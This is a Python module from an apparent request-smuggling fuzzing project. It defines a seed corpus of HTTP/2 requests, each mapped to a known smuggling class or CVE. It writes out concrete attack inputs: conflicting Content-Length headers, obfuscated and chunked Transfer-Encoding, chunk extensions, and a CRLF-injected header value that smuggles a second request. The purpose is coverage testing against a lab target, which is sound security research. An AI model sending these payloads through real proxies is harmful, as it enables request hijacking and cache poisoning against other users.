# Phage: request-smuggling CVE/class corpus.
# License: Apache-2.0 License

"""Hand-built genomes, one per known HTTP request-smuggling class/CVE.

Each renders (through reference.render_h1, a header/CL-trusting downgrade) into
an H1 request a vulnerable proxy would forward such that the backend parses two
requests. Used to prove coverage of the class landscape and as search seeds.
"""

from typing import Dict

from .genome import Data, Genome, Headers, SMUGGLE_PAYLOAD

_SMUG = SMUGGLE_PAYLOAD


def _pseudo(cl=None, extra=()):
    fields = [
        (b":method", b"POST"),
        (b":scheme", b"https"),
        (b":authority", b"lab"),
        (b":path", b"/"),
    ]
    if cl is not None:
        fields.append((b"content-length", cl))
    fields.extend(extra)
    return tuple(fields)


def _req(cl=None, extra=(), body=_SMUG) -> Genome:
    return [Headers(_pseudo(cl, extra)), Data(body, end_stream=True)]


# name (mapped CVE/class) -> genome
CORPUS: Dict[str, Genome] = {
    "CL.0 (CVE-2019-20372 class)": _req(cl=b"0"),
    "CL under-declared": _req(cl=b"4"),
    "CL.CL duplicate (undici CVE-2026-1525)": _req(
        cl=str(len(_SMUG)).encode(), extra=((b"Content-Length", b"0"),)
    ),
    "TE.CL (chunked + content-length)": _req(
        cl=b"0", extra=((b"transfer-encoding", b"chunked"),), body=b"0\r\n\r\n" + _SMUG
    ),
    "TE.TE obfuscated": _req(
        extra=((b" transfer-encoding", b"chunked"),), body=b"0\r\n\r\n" + _SMUG
    ),
    "chunk-extension (CVE-2025-55315 class)": _req(
        extra=((b"transfer-encoding", b"chunked"),),
        body=b"0;ext=x\r\n\r\n" + _SMUG,
    ),
    "CRLF header injection (undici CVE-2026-1527)": _req(
        cl=b"0",
        extra=((b"x-smuggle", b"1\r\n\r\n" + _SMUG.rstrip(b"\r\n")),),
        body=b"",
    ),
}
